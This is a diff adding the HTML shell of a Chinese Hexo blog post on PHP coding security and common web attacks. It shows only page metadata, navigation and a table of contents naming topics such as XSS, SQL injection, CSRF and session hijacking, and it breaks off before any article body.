@@ -1,0 +1,1645 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)">
+<meta name="generator" content="Hexo 5.4.0">
+
+<link rel="preconnect" href="https://unpkg.com" crossorigin>
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/favicon/safari-pinned-tab.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://unpkg.com/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://unpkg.com/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"ni9ne.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.8.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="PHP编程安全Cookie简介HTTP是一种无状态协议, 即不对请求和响应之间的通信状态进行保存. 也就是说, 无法根据之前的状态关联本次的请求处理. 目的是更快的处理大量事务, 确保协议的可伸缩性">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP编码安全及常见攻击">
+<meta property="og:url" content="https://ni9ne.github.io/2022/08/22/%E5%AE%89%E5%85%A8/PHP%E7%BC%96%E7%A0%81%E5%AE%89%E5%85%A8%E5%8F%8A%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="NI9NE&#39;s Zone">
+<meta property="og:description" content="PHP编程安全Cookie简介HTTP是一种无状态协议, 即不对请求和响应之间的通信状态进行保存. 也就是说, 无法根据之前的状态关联本次的请求处理. 目的是更快的处理大量事务, 确保协议的可伸缩性">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5b1eb843bebdf74317d35b9d48641ce1-fc2d819.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5a4f1d6afddf1b00bbeb932b988eb3ec-73541a8.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/231f512a97705bc18fdefad67c6a1cf3-40aae6f.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b18347cab7175548a852fea3020196b8-fe0b8a0.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/0c94125098751edd51f007d625fd14d7-7505744.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e5c7018912f2d264a4e741517f62fb6f-bc89a16.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ae444459dddc7737b6fd57372544a3bd-cfebaf8.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/bcfdfc16356c795428f24d58587fff1b-e9abeb0.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/06491573400c70b760d123855f2b0951-4019c91.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/73852fd699e8745eab4e9ed6e7052b5e-a581dcd.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b88a194f1c00e444a2e181857f6b295c-ad70927.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f2408d519e6b0598afbbed974528cff9-bc0d1aa.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9fe06249a4c3f49f740f5241159a76ce-bebfdd9.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/dda1006bebd359ef7d60210ffea107f3-2180dc8.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5b8b7380fecd34839627c7e99d8fdad2-e6811c0.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f4abb263cbb83f3d632dd8ea05b1e7cd-ad0da87.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/dca607ff717a43a2a94bb15aa3b9ab28-0d72f5c.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/33800ebd86c306a90c6a2ae2f68f2403-a1265f1.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/daeccb79ee0b5bde3f46f97222071318-16f97e5.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/d79d85c52814b41c936fd3166afc7088-b7b0265.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8c94882ee92d3c129313650a4024415d-87a7746.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/318dd6c2c614ccacda91cd24903c5879-7fbb498.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/bae27fc34c07da5071be9c8a26b1e2da-ef7ff12.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/960c3dd4af25438caec235bdac842896-deb7ac0.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a795e0d4a8d02b584b41049bf33d930e-d99973b.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/98982edad9d258e8a6a9b88101f2f50f-b9b1923.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/1918ea18397b8b65c234a533029a1caf-d661208.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e83386364b6d0c26fe9c4214ee39c687-2d6293d.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5118161300b4a391b533193c1bccdab5-61b4e6f.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c2e47deac0e92cbcb8e8871d901fca62-9e3ee52.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/4b58b688040bbd7cb0da4c8ed422bb4c-7adf890.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f0a5d4d6507941ee1ba6e1ff843bc96c-e833054.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/7108dd61f870ad1561862b1699c67401-c636235.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/328a63fa24f412a96b28b834b403439a-5a51513.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b2afb282f2858018f2b14df3039376f8-88adc0d.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e34eb616c1d76ff51216bce014492c01-de36d7a.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/eb62cbdb2cbcc7351eb9f5295f853ad4-c050011.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/07b0207e96cdca12ab1fa484c79b5dbb-0c30532.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/307a2ad70df94ae2f31ccddf3e6e993b-d54d5c6.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/40db245eb8a5306c5cf9a36661a4b498-0bbf153.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a669e5ba0cdd20ed1a9ef61c58f80536-7d6b5a0.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2b8ab5ee31afaa29daf9c8c1a74f4207-bb9d70b.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c36eafce4a03d2075ef093ed3898ae68-b5a86ae.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b029b662b01229f0d4a3e1d58e7e8921-52f46f7.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c6eb98a75be2fef804edcc6b72faa0c3-360995f.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/406bdbd2f8cdff7b0e0209bb84556f25-52c8aac.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3926a67c19a11654e615926244a565fe-f5e8eee.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/0acb6220fb22e8ebac9c46a6a2ccf255-eebd6c2.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/7f04c67dec6e85b43c60d0785faba5eb-2e65b65.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/90f284a4a143655a75824ffcda1426ce-a74d589.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ade751cbcf447f63c21270d6a920be3c-96c7cce.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e51c4e3c1cda51b2eb0057a4851c62d8-4257e93.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/345583de1e1b940626cbd79228497524-a336fb5.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ea61602f148ba8dbd93405f0e4f3b43e-5f92ef0.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e7c1d15011079f938d9de11fbc29be1d-c06feaa.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/05d7d0454e0ea2c56e8673df629d2c12-e82ed0e.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9e28a8d7ecfe3ceca5132f5821b2b7d4-55bd73a.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ec14bc38e01a1c3e071897ef418506df-1c0e51c.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9f22cd09732fb15d8c36279ccc5a38d2-63712fe.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b707e8b80910f90b56c78bbb381868d6-da8b2bd.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8d69192c8659a05f764663bbee36d5a3-a50b9d8.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3e5962f26bed8d553ec9f17d6cafe24c-a12ac4f.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9ffefa6eb6c260615b3202617cfebb36-8757277.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/bbbd0b8d784c15b58a0f80955acfbc96-fbe6d36.png">
+<meta property="article:published_time" content="2022-08-22T10:56:13.000Z">
+<meta property="article:modified_time" content="2022-09-10T05:12:04.689Z">
+<meta property="article:author" content="NI9NE">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="后端">
+<meta property="article:tag" content="项目">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5b1eb843bebdf74317d35b9d48641ce1-fc2d819.png">
+
+
+<link rel="canonical" href="https://ni9ne.github.io/2022/08/22/%E5%AE%89%E5%85%A8/PHP%E7%BC%96%E7%A0%81%E5%AE%89%E5%85%A8%E5%8F%8A%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://ni9ne.github.io/2022/08/22/%E5%AE%89%E5%85%A8/PHP%E7%BC%96%E7%A0%81%E5%AE%89%E5%85%A8%E5%8F%8A%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB/","path":"2022/08/22/安全/PHP编码安全及常见攻击/","title":"PHP编码安全及常见攻击"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>PHP编码安全及常见攻击 | NI9NE's Zone</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">NI9NE's Zone</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">53</span></a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">6</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">99</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP%E7%BC%96%E7%A8%8B%E5%AE%89%E5%85%A8"><span class="nav-number">1.</span> <span class="nav-text">PHP编程安全</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Cookie%E7%AE%80%E4%BB%8B"><span class="nav-number">1.1.</span> <span class="nav-text">Cookie简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web%E5%AE%89%E5%85%A8%E6%80%BB%E8%A7%88"><span class="nav-number">1.2.</span> <span class="nav-text">Web安全总览</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E5%8A%A8%E6%94%BB%E5%87%BB"><span class="nav-number">1.2.1.</span> <span class="nav-text">主动攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A2%AB%E5%8A%A8%E6%94%BB%E5%87%BB"><span class="nav-number">1.2.2.</span> <span class="nav-text">被动攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E9%98%B2%E5%BE%A1%E8%A2%AB%E5%8A%A8%E6%94%BB%E5%87%BB"><span class="nav-number">1.2.3.</span> <span class="nav-text">浏览器防御被动攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%8A%9F%E8%83%BD%E4%B8%80"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">浏览器安全功能一</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%8A%9F%E8%83%BD%E4%BA%8C"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">浏览器安全功能二</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3"><span class="nav-number">1.2.4.</span> <span class="nav-text">应用程序安全隐患</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web%E5%BA%94%E7%94%A8%E5%8A%9F%E8%83%BD%E4%B8%8E%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3%E5%85%B3%E7%B3%BB"><span class="nav-number">1.2.5.</span> <span class="nav-text">Web应用功能与安全隐患关系</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A1%B5%E9%9D%A2%E6%98%BE%E7%A4%BA%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98"><span class="nav-number">1.3.</span> <span class="nav-text">页面显示相关问题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS"><span class="nav-number">1.3.1.</span> <span class="nav-text">跨站脚本XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AA%83%E5%8F%96Cookie"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">窃取Cookie</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AF%A1%E6%94%B9%E7%BD%91%E9%A1%B5"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">篡改网页</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#href-src%E5%B1%9E%E6%80%A7XSS"><span class="nav-number">1.3.1.3.</span> <span class="nav-text">href&#x2F;src属性XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JavaScript%E7%9A%84%E5%8A%A8%E6%80%81%E7%94%9F%E6%88%90"><span class="nav-number">1.3.1.4.</span> <span class="nav-text">JavaScript的动态生成</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%94%99%E8%AF%AF%E6%8A%A5%E5%91%8A%E5%AF%BC%E8%87%B4%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="nav-number">1.3.2.</span> <span class="nav-text">错误报告导致信息泄露</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A1%B5%E9%9D%A2%E6%98%BE%E7%A4%BA%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="nav-number">1.4.</span> <span class="nav-text">页面显示相关问题解决方案</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS%E5%88%86%E7%B1%BB"><span class="nav-number">1.4.1.</span> <span class="nav-text">XSS分类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS%E4%BA%A7%E7%94%9F%E6%A0%B9%E6%BA%90"><span class="nav-number">1.4.2.</span> <span class="nav-text">XSS产生根源</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="nav-number">1.4.3.</span> <span class="nav-text">解决方案</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E8%B0%83%E7%94%A8%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98"><span class="nav-number">1.5.</span> <span class="nav-text">SQL调用相关问题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">1.5.1.</span> <span class="nav-text">SQL注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E5%A4%84%E7%90%86%E4%B8%AD%E5%BC%95%E5%85%A5%E7%9A%84%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3-CSRF"><span class="nav-number">1.6.</span> <span class="nav-text">关键处理中引入的安全隐患-CSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B8%E5%9E%8B%E6%94%BB%E5%87%BB%E6%A8%A1%E5%BC%8F"><span class="nav-number">1.6.1.</span> <span class="nav-text">典型攻击模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88-1"><span class="nav-number">1.6.2.</span> <span class="nav-text">解决方案</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BE%85%E5%8A%A9%E6%80%A7%E5%AF%B9%E7%AD%96"><span class="nav-number">1.6.3.</span> <span class="nav-text">辅助性对策</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8D%E5%AE%8C%E5%96%84%E7%9A%84%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86"><span class="nav-number">1.7.</span> <span class="nav-text">不完善的会话管理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96%E4%BC%9A%E8%AF%9DID%E6%96%B9%E5%BC%8F"><span class="nav-number">1.7.1.</span> <span class="nav-text">第三方获取会话ID方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%84%E6%B5%8B%E4%BC%9A%E8%AF%9DID"><span class="nav-number">1.7.1.1.</span> <span class="nav-text">预测会话ID</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AA%83%E5%8F%96%E4%BC%9A%E8%AF%9DID"><span class="nav-number">1.7.1.2.</span> <span class="nav-text">窃取会话ID</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%AB%E6%8C%81%E4%BC%9A%E8%AF%9DID"><span class="nav-number">1.7.1.3.</span> <span class="nav-text">劫持会话ID</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3"><span class="nav-number">1.7.2.</span> <span class="nav-text">安全隐患</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BC%9A%E8%AF%9DID%E5%8F%AF%E9%A2%84%E6%B5%8B"><span class="nav-number">1.7.2.1.</span> <span class="nav-text">会话ID可预测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BC%9A%E8%AF%9DID%E5%B5%8C%E5%85%A5URL"><span class="nav-number">1.7.2.2.</span> <span class="nav-text">会话ID嵌入URL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9B%BA%E5%AE%9A%E4%BC%9A%E8%AF%9DID"><span class="nav-number">1.7.2.3.</span> <span class="nav-text">固定会话ID</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91%E7%9B%B8%E5%85%B3"><span class="nav-number">1.8.</span> <span class="nav-text">重定向相关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%87%AA%E7%94%B1%E9%87%8D%E5%AE%9A%E5%90%91"><span class="nav-number">1.8.1.</span> <span class="nav-text">自由重定向</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP%E6%B6%88%E6%81%AF%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="nav-number">1.8.2.</span> <span class="nav-text">HTTP消息头注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cookie%E8%BE%93%E5%87%BA%E7%9B%B8%E5%85%B3"><span class="nav-number">1.9.</span> <span class="nav-text">cookie输出相关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8%E9%80%94%E4%B8%8D%E5%BD%93"><span class="nav-number">1.9.1.</span> <span class="nav-text">用途不当</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BE%93%E5%87%BA%E6%96%B9%E6%B3%95%E4%B8%8D%E5%BD%93"><span class="nav-number">1.9.2.</span> <span class="nav-text">输出方法不当</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86%E7%9B%B8%E5%85%B3"><span class="nav-number">1.10.</span> <span class="nav-text">文件处理相关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.10.1.</span> <span class="nav-text">目录遍历漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E9%83%A8%E6%96%87%E4%BB%B6%E8%A2%AB%E5%85%AC%E5%BC%80"><span class="nav-number">1.10.2.</span> <span class="nav-text">内部文件被公开</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E7%94%A8OS%E5%91%BD%E4%BB%A4%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98"><span class="nav-number">1.11.</span> <span class="nav-text">调用OS命令相关问题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#OS%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="nav-number">1.11.1.</span> <span class="nav-text">OS命令注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%97%AE%E9%A2%98"><span class="nav-number">1.12.</span> <span class="nav-text">文件上传问题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%92%88%E5%AF%B9%E4%B8%8A%E4%BC%A0%E7%9A%84DOS%E6%94%BB%E5%87%BB"><span class="nav-number">1.12.1.</span> <span class="nav-text">针对上传的DOS攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC"><span class="nav-number">1.12.2.</span> <span class="nav-text">上传执行脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%B1%E4%BD%BF%E7%94%A8%E6%88%B7%E4%B8%8B%E8%BD%BD%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6"><span class="nav-number">1.12.3.</span> <span class="nav-text">诱使用户下载恶意文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#include%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98"><span class="nav-number">1.13.</span> <span class="nav-text">include相关问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#eval%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98"><span class="nav-number">1.14.</span> <span 